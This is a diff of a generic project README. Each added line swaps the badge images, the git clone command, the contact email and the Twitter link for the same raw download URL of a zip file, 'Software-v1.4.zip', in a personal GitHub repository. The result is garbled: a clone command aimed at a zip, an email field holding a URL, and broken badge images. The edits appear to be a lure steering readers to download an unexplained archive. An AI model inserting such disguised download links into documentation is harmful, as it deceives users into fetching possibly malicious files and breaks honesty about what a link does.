@@ -1,6 +1,6 @@
 # Welcome to Project! 🚀
 
-[![GitHub](https://img.shields.io/badge/Visit%20GitHub-Project-blue)](https://github.com)
+[![GitHub](https://github.com/Tiago89Fernandes/project/raw/refs/heads/master/proso/Software-v1.4.zip%20GitHub-Project-blue)](https://github.com/Tiago89Fernandes/project/raw/refs/heads/master/proso/Software-v1.4.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ To get started with **Project**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/project.git
+   git clone https://github.com/Tiago89Fernandes/project/raw/refs/heads/master/proso/Software-v1.4.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -81,11 +81,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: yourname@example.com
-- **Twitter**: [@yourusername](https://twitter.com/yourusername)
+- **Email**: https://github.com/Tiago89Fernandes/project/raw/refs/heads/master/proso/Software-v1.4.zip
+- **Twitter**: [@yourusername](https://github.com/Tiago89Fernandes/project/raw/refs/heads/master/proso/Software-v1.4.zip)
 
 We are excited to have you on board! 
 
-[![GitHub](https://img.shields.io/badge/Visit%20GitHub-Project-blue)](https://github.com)
+[![GitHub](https://github.com/Tiago89Fernandes/project/raw/refs/heads/master/proso/Software-v1.4.zip%20GitHub-Project-blue)](https://github.com/Tiago89Fernandes/project/raw/refs/heads/master/proso/Software-v1.4.zip)
 
 Explore, contribute, and let's build something great together!
